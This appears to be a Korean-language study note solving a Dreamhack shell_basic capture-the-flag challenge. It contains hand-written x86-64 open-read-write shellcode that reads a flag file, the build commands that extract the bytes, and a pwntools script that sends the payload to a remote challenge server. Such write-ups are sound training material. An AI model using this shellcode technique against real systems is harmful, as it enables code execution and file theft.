#system-hacking 
# Payload
- 어셈블리 직접 작성한 코드
```nasm
; 410.asm

section .text
global _start
_start:
    push 0x0                        ; NULL byte
    mov rax, 0x676e6f6f6f6f6f6f     ; "oooooong"
    push rax
    mov rax, 0x6c5f73695f656d61     ; "ame_is_l"
    push rax
    mov rax, 0x6e5f67616c662f63     ; "c/flag_n"
    push rax
    mov rax, 0x697361625f6c6c65     ; "ell_basi"
    push rax
    mov rax, 0x68732f656d6f682f     ; "/home/sh"
    push rax
    mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
    xor rsi, rsi    ; rsi = 0   ; RD_ONLY
    xor rdx, rdx    ; rdx = 0
    mov rax, 2      ; rax = 2   ; syscall_open
    syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)
    
    mov rdi, rax    ; rdi = fd
    mov rsi, rsp
    sub rsi, 0x30   ; rsi = rsp-0x30    ; buf
    mov rdx, 0x30   ; rdx = 0x30        ; len
    mov rax, 0x0    ; rax = 0           ; syscall_read
    syscall         ; read(fd, buf, 0x30)

    mov rdi, 1      ; rdi = 1   ; fd = stdout
    mov rax, 0x1    ; rax = 1   ; syscall_write
    syscall         ; write(fd, buf, 0x30)

    xor rdi, rdi    
    mov rax, 0x3c
    syscall
```
- `int fd = open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY, NULL)`를 실행하는 Assembly 코드를 작성한다.
- `"/home/shell_basic/flag_name_is_loooooong"`은 총 40바이트이고, 64비트 아키텍처이기 때문에 8바이트씩 push 5회로 스택에 값을 채우면 될 것으로 생각되나, 그렇지 않다.
- C 문자열의 끝에는 항상 NULL이 있어야 하기 때문에, 41바이트를 전달해야 한다. `\x00`
- 끝 문자열부터 스택에 넣어야 한다. 스택은 아래로 자라기 때문에, 맨 나중에 넣어야 순서대로 쭉 읽을 때 막힘이 없다.
- push해야 할 값들은 python으로 간단하게 계산 가능하다.
```python
>>> def f(msg):
...     return hex(int.from_bytes(msg.encode(), "little"))
...
>>> f("oooooong")
'0x676e6f6f6f6f6f6f'
>>> f("ame_is_l")
'0x6c5f73695f656d61'
>>> f("c/flag_n")
'0x6e5f67616c662f63'
>>> f("ell_basi")
'0x697361625f6c6c65'
>>> f("/home/sh")
'0x68732f656d6f682f'
```
- 나머지 과정은 크게 다르지 않다.
- 만들어진 어셈블리를 바이트코드로 만드는 과정은 다음과 같다.
```shell
nasm -f elf64 401.asm
objcopy --dump-section .text=410.bin 410.o
xxd 410.bin
cat 410.bin | ./shell_basic
```
# shellcraft 사용하기
- Python에서 pwntools의 shellcraft를 사용하면 open, read, write의 호출 과정을 직접 셸코드화하여 생성해주어 셸코드를 만들기 편리하다. 해당 바이너리가 amd64 아키텍처를 사용하기 때문에 `context.arch = "amd64"`를 지정해 주어야 함에 유의해야 한다.
```python
from pwn import *

# p = process("./shell_basic")
p = remote("host8.dreamhack.games", 19606)
context.arch = "amd64"

dir = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

print(asm(shellcode))

p.sendlineafter(b"shellcode: ", asm(shellcode))
p.interactive()
```
![[Pasted image 20251009020932.png]]
- 0x30 = 48바이트를 출력하기 때문에 스택 뒤의 쓰레기값까지 출력하는 것을 알 수 있다.
- 